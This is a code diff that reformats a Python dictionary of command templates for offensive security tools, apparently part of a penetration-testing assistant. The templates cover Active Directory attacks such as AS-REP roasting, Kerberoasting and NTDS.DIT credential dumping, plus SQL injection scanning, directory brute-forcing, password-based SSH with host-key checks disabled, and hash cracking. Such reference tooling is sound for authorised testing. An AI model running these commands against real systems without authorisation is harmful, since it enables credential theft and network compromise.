@@ -25,33 +25,26 @@ from __future__ import annotations
 _TOOL_TEMPLATES: dict[str, tuple[str, str]] = {
     # AD / impacket
     "GetNPUsers.py": (
-        "GetNPUsers.py -no-pass -dc-ip <host> -usersfile users.txt "
-        "<domain>/ -outputfile /tmp/asrep_hashes.txt",
-        "Save hashes to a file so the next stage (hashcat) can read "
-        "them. -no-pass = AS-REP roast without creds.",
+        "GetNPUsers.py -no-pass -dc-ip <host> -usersfile users.txt <domain>/ -outputfile /tmp/asrep_hashes.txt",
+        "Save hashes to a file so the next stage (hashcat) can read them. -no-pass = AS-REP roast without creds.",
     ),
     "GetUserSPNs.py": (
-        "GetUserSPNs.py -dc-ip <host> -request "
-        "<domain>/<user>:'<pass>' -outputfile /tmp/spn_hashes.txt",
+        "GetUserSPNs.py -dc-ip <host> -request <domain>/<user>:'<pass>' -outputfile /tmp/spn_hashes.txt",
         "Kerberoast pulls TGS tickets for service accounts. The -request "
         "flag emits hash format ready for hashcat -m 13100.",
     ),
     "secretsdump.py": (
-        "secretsdump.py -just-dc-ntlm "
-        "<domain>/<user>:'<pass>'@<host>",
-        "DRSUAPI dump of NTDS.DIT. -just-dc-ntlm skips the slower "
-        "system-secrets path.",
+        "secretsdump.py -just-dc-ntlm <domain>/<user>:'<pass>'@<host>",
+        "DRSUAPI dump of NTDS.DIT. -just-dc-ntlm skips the slower system-secrets path.",
     ),
     "bloodhound-python": (
-        "bloodhound-python -u '<user>' -p '<pass>' -d <domain> "
-        "-c all -ns <host>",
+        "bloodhound-python -u '<user>' -p '<pass>' -d <domain> -c all -ns <host>",
         "-c all collects users/groups/computers/sessions/ACLs. Run "
         "the BloodHound CE GUI afterwards to query attack paths.",
     ),
     # LDAP / SMB
     "ldapsearch": (
-        "ldapsearch -x -H ldap://<host> -b 'DC=<dc1>,DC=<dc2>' "
-        "-s sub '(objectClass=user)' sAMAccountName",
+        "ldapsearch -x -H ldap://<host> -b 'DC=<dc1>,DC=<dc2>' -s sub '(objectClass=user)' sAMAccountName",
         "Always include an objectClass filter — the unfiltered "
         "subtree dump floods the chunk. Asking for a single "
         "attribute keeps output greppable.",
@@ -100,43 +93,35 @@ _TOOL_TEMPLATES: dict[str, tuple[str, str]] = {
         "common services.",
     ),
     "sqlmap": (
-        "sqlmap -u 'http://<host>/<path>?<param>=val' --batch "
-        "--level=3 --risk=2 --random-agent",
+        "sqlmap -u 'http://<host>/<path>?<param>=val' --batch --level=3 --risk=2 --random-agent",
         "--batch answers all interactive prompts with the safe "
         "default. level 3 + risk 2 covers cookies/headers/UA and "
         "stacked queries without going destructive.",
     ),
     "nuclei": (
         "nuclei -u http://<host> -severity high,critical -timeout 5",
-        "Filter to high/critical to keep noise down. -timeout 5 "
-        "bounds slow templates.",
+        "Filter to high/critical to keep noise down. -timeout 5 bounds slow templates.",
     ),
     "gobuster": (
-        "gobuster dir -u http://<host> "
-        "-w /usr/share/wordlists/dirb/common.txt -t 20 -q",
-        "-t 20 keeps thread count reasonable for shared targets. "
-        "-q silences banner.",
+        "gobuster dir -u http://<host> -w /usr/share/wordlists/dirb/common.txt -t 20 -q",
+        "-t 20 keeps thread count reasonable for shared targets. -q silences banner.",
     ),
     # Auth / pivot
     "sshpass": (
-        "sshpass -p '<pass>' ssh -o StrictHostKeyChecking=no "
-        "-o UserKnownHostsFile=/dev/null <user>@<host> '<cmd>'",
+        "sshpass -p '<pass>' ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null <user>@<host> '<cmd>'",
         "Inline ssh with a captured password. Strict host key "
         "checking off + null known_hosts so the first connect "
         "doesn't prompt. Always quote <cmd>.",
     ),
     "hashcat": (
-        "hashcat -m <mode> -a 0 hashes.txt "
-        "/usr/share/wordlists/rockyou.txt --show",
+        "hashcat -m <mode> -a 0 hashes.txt /usr/share/wordlists/rockyou.txt --show",
         "Modes: 18200 (krb5asrep), 13100 (krb5tgs), 1000 (NTLM), "
         "5600 (NetNTLMv2). --show pulls already-cracked from the "
         "potfile without re-running the engine.",
     ),
     "john": (
-        "john --wordlist=/usr/share/wordlists/rockyou.txt "
-        "--format=<format> hashes.txt",
-        "Formats: krb5asrep-23, krb5tgs, NT (NTLM). Run "
-        "``john --show`` after to surface cracked entries.",
+        "john --wordlist=/usr/share/wordlists/rockyou.txt --format=<format> hashes.txt",
+        "Formats: krb5asrep-23, krb5tgs, NT (NTLM). Run ``john --show`` after to surface cracked entries.",
     ),
 }
 
